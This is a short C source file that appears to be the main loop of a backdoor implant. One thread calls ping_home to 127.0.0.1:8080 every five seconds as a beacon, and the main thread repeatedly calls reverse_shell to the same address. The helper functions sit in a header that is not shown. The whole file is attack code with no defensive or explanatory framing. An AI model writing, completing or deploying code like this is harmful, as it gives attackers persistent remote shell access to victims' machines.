#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include "core.h"

#define IP_ADDR "127.0.0.1"
#define PORT 8080

void *inf_ping()
{
	while (1)
	{
		ping_home(IP_ADDR, PORT);
		sleep(5);
	}
}

int main()
{
	pthread_t thread_id;

	pthread_create(&thread_id, NULL, inf_ping, NULL);

	while (1)
	{
		reverse_shell(IP_ADDR, PORT);
		sleep(5);
	}

	return 0;
}